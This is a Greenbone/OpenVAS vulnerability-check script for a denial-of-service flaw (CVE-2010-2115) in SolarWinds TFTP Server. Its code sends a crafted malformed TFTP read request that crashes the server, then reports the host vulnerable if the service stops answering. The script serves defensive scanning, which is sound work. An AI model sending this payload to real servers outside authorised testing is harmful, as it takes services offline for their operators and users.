if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100653" );
	script_version( "2020-11-10T09:46:51+0000" );
	script_tag( name: "last_modification", value: "2020-11-10 09:46:51 +0000 (Tue, 10 Nov 2020)" );
	script_tag( name: "creation_date", value: "2010-05-25 13:42:13 +0200 (Tue, 25 May 2010)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_cve_id( "CVE-2010-2115" );
	script_bugtraq_id( 40333 );
	script_name( "SolarWinds TFTP Server 'Read' Request (Opcode 0x01) Denial Of Service Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/40333" );
	script_category( ACT_DENIAL );
	script_family( "Denial of Service" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "tftpd_detect.sc", "global_settings.sc", "os_detection.sc" );
	script_require_udp_ports( "Services/udp/tftp", 69 );
	script_mandatory_keys( "tftp/detected" );
	script_require_keys( "Host/runs_windows" );
	script_exclude_keys( "keys/TARGET_IS_IPV6" );
	script_tag( name: "summary", value: "SolarWinds TFTP Server is prone to a denial-of-service
  vulnerability." );
	script_tag( name: "impact", value: "A successful exploit can allow attackers to crash the server process,
  resulting in a denial-of-service condition." );
	script_tag( name: "affected", value: "SolarWinds TFTP Server 10.4.0.10 is vulnerable. Other versions may
  also be affected." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	exit( 0 );
}
if(TARGET_IS_IPV6()){
	exit( 0 );
}
require("tftp.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = service_get_port( default: 69, proto: "tftp", ipproto: "udp" );
if(!tftp_alive( port: port )){
	exit( 0 );
}
soc = open_sock_udp( port );
if(!soc){
	exit( 0 );
}
req = raw_string( 0x00, 0x01, 0x01, 0x00 ) + "NETASCII" + raw_string( 0x00 );
send( socket: soc, data: req );
close( soc );
if(!tftp_alive( port: port )){
	security_message( port: port, proto: "udp" );
	exit( 0 );
}
exit( 99 );

